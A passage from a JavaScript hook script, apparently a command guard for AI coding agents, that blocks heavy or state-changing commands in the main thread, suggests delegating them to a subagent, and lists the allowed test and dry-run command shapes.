  try { tierText = devswarmPrimary && require('./lib/primary-tier.js').primaryTierTextOn(process.env, (payload && payload.cwd) || process.cwd()); } catch (_) { tierText = false; }
  const H = require('./lib/host-text.js');
  const codexHost = H.isCodex(payload);
  const heavyWhat = (cls && cls.kind === 'remote' ? 'state-changing remote command' : 'heavy command') +
    (detail ? ' ' + detail : '') + ' blocked in the main thread.';
  // Codex variant: no scratchpad-script path (no scratchpad dir, no
  // run_in_background on Codex Bash), Codex sub-agent + cheap-tier wording.
  const SUB = codexHost ? H.CODEX_SUBAGENT : 'a subagent';
  const delegateTo = 'delegate to ' + (codexHost ? H.CODEX_CHEAP : SUB) + ' (it returns a short summary)';
  // Compact allowed list: exactly the shapes isQualifyingSingleTargetCheck accepts
  // (piped to tail/head/wc/grep -c/grep -m N) plus the scratchpad read-only script.
  const allowedShapes = 'piped to tail/head/wc/grep -c: `node --test <1-2 files>`, `python3 -m pytest -q <file>`, `vitest|jest <1-2 files>`, `ctest -R <name>`, `<cc> -fsyntax-only`, --check/--dry-run/--list forms' +
    (codexHost ? '.' : '; or a read-only scratchpad script (executable, absolute path, no VAR= prefix) run with run_in_background.');
  const reason = bm().blockMessage({
    guard: 'command-guard',
    what: heavyWhat,
    why: 'Raw output floods the main thread.',
    instead: (devswarmPrimary && tierText
      ? 'workspace-scale matter (feature/fix/deploy): `node scripts/devswarm.js spawn <branch> -p "<brief>"` (guard-exempt, run inline); a single command: ' + delegateTo + '. Never hand a workspace-scale matter to ' + SUB + '.'
      : delegateTo + '.') + cdJoinHint,
    allowed: allowedShapes,
  });
  emitBlock(reason);
}

if (require.main === module) {
  try {
    main();
  } catch (_) {
    // Fail-open: never block a turn due to a hook bug.
  }
  process.exit(0);
}

module.exports = {
  ANTI_HALL_CLI_PATTERNS,
  scriptPathVerdict,
  classifyBashWork,
  isStateChangingGitSegment,
  isRecoveryGitSegment,
  bashWriteTargets,
  isHeavyCommand,
  isAllowedGcloudReadCommand,
  isHeavyGhSegment,
  isScratchpadOrTmpPath,
  splitSegmentsDetailed,
  effectiveVerb,
};
